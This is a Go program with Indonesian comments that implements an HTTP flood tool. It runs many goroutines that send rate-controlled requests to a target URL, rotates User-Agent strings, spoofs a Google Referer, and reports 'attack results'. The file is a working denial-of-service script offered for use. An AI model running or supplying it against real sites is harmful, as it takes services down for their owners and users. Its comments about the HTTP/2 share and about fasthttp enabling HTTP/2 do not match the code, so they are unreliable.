package main

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	userAgents      []string
	successCount    uint64
	errorCount      uint64
	statusCodes     = make(map[int]uint64)
	mutex           sync.Mutex
	http1RequestCount uint64 // Counter untuk request HTTP/1.1
	http2RequestCount uint64 // Counter untuk request HTTP/2
)

func init() {
	rand.Seed(time.Now().UnixNano())
	userAgents = readLines("ua.txt")
}

func readLines(filename string) []string {
	content, err := os.ReadFile(filename)
	if err != nil {
		fmt.Printf("Error membaca file %s: %v\n", filename, err)
		os.Exit(1)
	}
	return splitLines(string(content))
}

func splitLines(data string) []string {
	lines := []string{}
	for _, line := range split(data, '\n') {
		lines = append(lines, line)
	}
	return lines
}

func split(s string, sep rune) []string {
	var res []string
	lastIndex := 0
	for i, c := range s {
		if c == sep {
			res = append(res, s[lastIndex:i])
			lastIndex = i + 1
		}
	}
	if lastIndex < len(s) {
		res = append(res, s[lastIndex:])
	}
	return res
}

func randomElement(elements []string) string {
	if len(elements) == 0 {
		return ""
	}
	return elements[rand.Intn(len(elements))]
}

func attack(targetURL string, duration time.Duration, rps int, wg *sync.WaitGroup) {
	defer wg.Done()

	// Buat dua client: satu untuk HTTP/1.1, satu untuk HTTP/2
	clientHTTP1 := &fasthttp.Client{}
	clientHTTP2 := &fasthttp.Client{}
	// HTTP/2 diaktifkan otomatis jika server mendukungnya
	clientHTTP2.MaxConnsPerHost = 1 // mengatur jumlah koneksi per host untuk client HTTP/2

	startTime := time.Now()
	interval := time.Second / time.Duration(rps) // Menghitung interval antara setiap request

	for time.Since(startTime) < duration {
		// Tentukan rasio lebih tinggi untuk HTTP/2, misal 70% HTTP/2 dan 30% HTTP/1.1
		var client *fasthttp.Client
		if rand.Intn(10) < 4 { // 70% HTTP/2
			client = clientHTTP2
			atomic.AddUint64(&http2RequestCount, 1)
		} else {
			client = clientHTTP1
			atomic.AddUint64(&http1RequestCount, 1)
		}

		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()

		req.SetRequestURI(targetURL)
		req.Header.Set("User-Agent", randomElement(userAgents))
		req.Header.Set("Referer", "https://google.com")

		err := client.Do(req, resp)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
		} else {
			atomic.AddUint64(&successCount, 1)
			statusCode := resp.StatusCode()
			mutex.Lock()
			statusCodes[statusCode]++
			mutex.Unlock()
		}

		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)

		// Tunggu sesuai dengan interval untuk mencapai rate per detik
		time.Sleep(interval)
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run main.go <target> <duration> <threads> <rps>")
		fmt.Println("Contoh: go run main.go https://example.com 10 20 100")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2] + "s")

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil || threads <= 0 {
		fmt.Println("Threads harus angka positif")
		os.Exit(1)
	}

	rps, err := strconv.Atoi(os.Args[4])
	if err != nil || rps <= 0 {
		fmt.Println("RPS harus angka positif")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(target, duration, rps, &wg)
	}

	wg.Wait()

	// Print hasil akhir
	fmt.Println("\n=== Hasil Serangan ===")
	fmt.Printf("Total request terkirim : %d\n", successCount+errorCount)
	fmt.Printf("Request sukses         : %d\n", successCount)
	fmt.Printf("Request gagal          : %d\n", errorCount)
	fmt.Printf("Request HTTP/1.1       : %d\n", http1RequestCount)
	fmt.Printf("Request HTTP/2         : %d\n", http2RequestCount)
	fmt.Println("\nStatus Code Diterima:")
	for code, count := range statusCodes {
		fmt.Printf("  %d : %d kali\n", code, count)
	}
}
